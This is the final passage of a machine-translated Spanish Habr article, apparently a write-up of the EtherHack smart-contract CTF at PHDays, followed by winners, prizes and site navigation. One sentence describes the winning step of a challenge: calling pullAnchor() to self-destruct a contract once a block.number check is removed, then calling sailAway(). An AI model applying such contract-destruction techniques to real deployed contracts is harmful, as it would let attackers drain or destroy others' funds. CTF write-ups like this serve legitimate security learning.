 3f ;;  basura </pre><br>  Si ahora llamamos a la función pullAnchor (), este contrato se destruirá inmediatamente, ya que ya no tenemos una verificación en block.number.  ¡Después de eso llamamos a la función sailAway () y celebramos la victoria! <br><br><h2>  Resultados </h2><br><ol><li>  Primer lugar y emisión en la cantidad equivalente a 1,000 dólares estadounidenses: Alexey Pertsev (p4lex) </li><li>  Segundo lugar y Ledger Nano S: Alexey Markov </li><li>  Tercer lugar y recuerdos de PHDays: Alexander Vlasov </li></ol><br>  Todos los resultados: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">etherhack.positive.com/#/scoreboard</a> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/d88/d86/955/d88d8695572199f7e3d800f34deb18ee.jpg" alt="imagen"><br><br>  ¡Felicitaciones a los ganadores y gracias a todos los participantes! <br><br>  PD: Gracias a <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Zeppelin</a> por <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">hacer que el</a> código fuente de la plataforma <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Ethernaut CTF sea de</a> código abierto. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/es414959/">https://habr.com/ru/post/es414959/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../es414945/index.html">La Universidad Johns Hopkins creó una piel artificial que siente dolor</a></li>
<li><a href="../es414947/index.html">Obteniendo Git para Windows bajo ReactOS</a></li>
<li><a href="../es414951/index.html">Gestión de acceso en Expressjs con CASL</a></li>
<li><a href="../es414953/index.html">Nvidia enseñó a la red neuronal a ralentizar el video</a></li>
<li><a href="../es414955/index.html">Las empresas usaron la palabra blockchain para aumentar la capitalización. Ayudado por un tiempo</a></li>
<li><a href="../es414961/index.html">Descripción general de SERM</a></li>
<li><a href="../es414963/index.html">Se ha encontrado una solución alternativa para evitar la protección con contraseña en iPhone / iPad. No realmente</a></li>
<li><a href="../es414965/index.html">“Protección de derechos de autor en la UE”: la nueva reforma no solo puede afectar a las plataformas de medios</a></li>
<li><a href="../es414967/index.html">Cómo reducir el tiempo de compilación de un proyecto usando Firebase Performance Plugin</a></li>
<li><a href="../es414969/index.html">Extender el proceso de compilación con MSBuild</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>